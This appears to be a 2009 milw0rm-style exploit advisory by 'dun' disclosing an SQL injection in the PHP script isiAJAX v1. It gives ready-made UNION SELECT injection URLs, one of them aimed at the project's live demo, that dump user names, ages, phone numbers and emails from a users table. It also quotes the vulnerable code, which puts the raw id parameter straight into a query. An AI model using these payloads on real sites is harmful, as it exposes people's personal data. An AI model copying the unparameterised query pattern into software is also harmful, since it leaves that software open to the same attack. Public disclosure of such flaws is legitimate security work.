@@ -1,0 +1,42 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ###################################################
+ #  [ isiAJAX v1 ]   SQL Injection Vulnerability   #
+ ###################################################
+ # 
+ # Script: "isiAJAX v1"
+ #
+ # Script site: http://isiajax.sourceforge.net/
+ # Download: http://sourceforge.net/project/showfiles.php?group_id=169754
+ #
+ # [SQL] Vuln: http://site.com/isiAJAX/ejemplo/paises.php?id=-1+UNION+SELECT+1,USER()--
+ #             http://isiajax.sourceforge.net/demos/practicos/busqueda/paises.php?id=-1+UNION+SELECT+1,CONCAT_WS(char(58),id,nombre,apellidos,id_pais,edad,telefono,email)+from+usuarios--
+ #
+ # Bug: ./isiAJAX/ejemplo/paises.php (linez: 10-14)
+ #
+ # ...
+ #	$paise = mysql_query("SELECT id, nombre FROM pais WHERE id_continente=$_GET[id]", $conexion);     //	
+ #	while ($paises = mysql_fetch_row($paise)) {				                                          //  SQL inj.
+ #	?>	<option value="<?=$paises[0];?>"><?=$paises[1];?></option>                                    //
+ #	<?
+ #	}
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2009 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2009-03-06]
